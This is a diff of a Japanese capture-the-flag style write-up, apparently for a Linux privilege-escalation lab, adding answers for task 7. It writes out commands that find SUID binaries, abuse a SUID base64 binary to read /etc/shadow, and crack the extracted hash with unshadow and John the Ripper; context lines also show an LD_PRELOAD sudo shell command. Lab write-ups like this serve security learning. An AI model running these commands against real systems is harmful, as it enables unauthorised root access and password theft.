@@ -117,6 +117,7 @@ sudoで実行できるプログラムを実行時に、この共有オブジェ�
 ```shell
 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
+
 ### タスク6の質問と解答
 
 1. sudo -lの出力を確認すればよい
@@ -136,3 +137,43 @@ $1$THM$WnbwlliCqxFRQepUTCkUT1
 
 ### タスク7質問と解答
 
+1. cat /etc/passwdの表示を確認
+2. 以下の手順で確認
+  - findコマンドでSUIDビットが立っているファイルを探す
+
+```shell
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+  - [GTFOBins](https://gtfobins.github.io/#%2Bsuid)で使えそうなコマンドを探すとbase64があったので以下のコマンドを実行
+
+```shell
+base64 /etc/shadow | base64 --decode
+```
+
+  - /etc/shadowの内容が表示されるので、user2の行をコピペし手元のKali Linuxで、shadow.txtファイルとして保存。
+  - /etc/passwdからuser2の行をコピペし手元のKali Linuxで、passwd.txtファイルとして保存。
+  - 手元のKali Linuxで以下のコマンドを実行
+
+```shell
+unshadow passwd.txt shadow.txt > password.txt
+```
+
+  - john the ripperでpassword.txtを解析
+
+```shell
+john --wordlist=/usr/share/wordlists/rockyou.txt password.txt
+```
+
+3. 以下の手順で確認
+
+  - findでflag3.txtを探す
+
+```shell
+find / -name '*flag3.txt' -ls 2>/dev/null
+```
+  - base64でflag3.txtの内容を確認
+  
+```shell
+base64 /home/ubuntu/flag3.txt | base64 --decode
+```
